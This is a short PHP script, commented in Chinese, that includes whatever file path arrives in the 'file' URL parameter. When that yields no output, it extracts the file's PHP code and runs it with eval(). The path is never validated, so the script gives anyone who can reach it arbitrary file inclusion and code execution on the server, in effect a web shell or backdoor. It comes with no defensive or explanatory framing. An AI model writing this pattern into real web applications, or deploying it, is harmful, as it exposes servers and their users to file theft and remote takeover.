<?php
$file = $_GET['file'] ?? '';

if (!$file || !file_exists($file)) {
    die('文件不存在');
}

// 尝试 include
ob_start();
include($file);
$result = ob_get_clean();

// 容错：提取 PHP 代码执行
if ($result === '') {
    $raw = file_get_contents($file);
    if (preg_match('/<\?php(.+?)\?>/s', $raw, $m)) {
        ob_start();
        eval($m[1]);
        $result = ob_get_clean();
    }
}

echo $result;
